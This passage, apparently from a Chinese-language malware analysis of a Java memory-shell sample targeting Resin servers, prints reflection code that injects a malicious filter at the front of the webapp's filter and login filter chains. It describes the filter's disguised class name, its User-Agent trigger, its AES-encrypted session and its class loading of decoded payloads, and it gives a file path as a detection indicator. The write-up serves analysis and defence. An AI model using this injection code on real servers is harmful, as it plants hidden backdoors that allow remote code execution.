    }
    fieldFilterMapperFilterMap.set(filtermapper, newFilterMappings);
    fieldWebappFilterMapper.set(webapp, filtermapper);
    //set loginFilterMapper
    Field fieldWebappLoginFilterMapper = null;
    try{
        fieldWebappLoginFilterMapper = webapp.getClass().getDeclaredField("_loginFilterMapper");
    }catch (NoSuchFieldException Exception){
        fieldWebappLoginFilterMapper = webapp.getClass().getSuperclass().getDeclaredField("_loginFilterMaper");
    }
    fieldWebappLoginFilterMapper.setAccessible(true);
    FilterMapper loginFilterMapper = (FilterMapper)fieldWebappLoginFilterMapper.get(webapp);
    ArrayList  orginLoginFilterMappings = (ArrayList) fieldFilterMapperFilterMap.get(loginFilterMapper);
    ArrayList newLoginFilterMappings = new ArrayList(orginLoginFilterMappings.size() + 1);
    newLoginFilterMappings.add(filterMapping);
    count = 0;
    while( count < orginLoginFilterMappings.size()){
        newLoginFilterMappings.add(orginLoginFilterMappings.get(count));
        ++ count;
    }
    fieldFilterMapperFilterMap.set(loginFilterMapper, newLoginFilterMappings);
    fieldWebappLoginFilterMapper.set(webapp, loginFilterMapper);
    webapp.getClass().getMethod("clearCache").invoke(webapp);
## 加载的的 filter 说明
对前序加载的`filter`字串进行base64解码及反编译，是一个实现了`filter`接口的自定义`filter`,全限定名为`com.caucho.filters.PseudodramaticallyFilter.class`
，利用`com.caucho.filters` resin 依赖进行伪装，`PseudodramaticallyFilter`翻译为`明显假的filter`
类结构如下图所示，`defineClass` 加载类时会调用static静态代码块，对字符串进行解密。
在 `dofilter` 模块，写明的匹配处理逻辑
样本使用`User-Agent`头做为匹配字符串 `Mozilla/5.0 (Windows NT 10.0; Win64; x64)
AppleWebKit/531.26 (KHTML, like Gecko) Chrome/86.0.4240.138 Safari/531.26`,
使用AES 加密会话，然后进行 `base64` 解码及类加载运行。
该`User-Agent`虽然在格式上和`Chrome`浏览器相同，但是未在`https://user-agents.net/`查询到相应的版本，隐蔽效果拔群。
## 备注
样本后续还进行了创建文件(/tmp/com/filters/PseudodramaticallyFilter.class:可以做为自查指标)，自删除等一些列操作，众位看官可自行分析
## 参考连接
  1. [java恶意样本调试指南](https://mp.weixin.qq.com/s/yvEHxhsedSwB12PTcQ5aRg)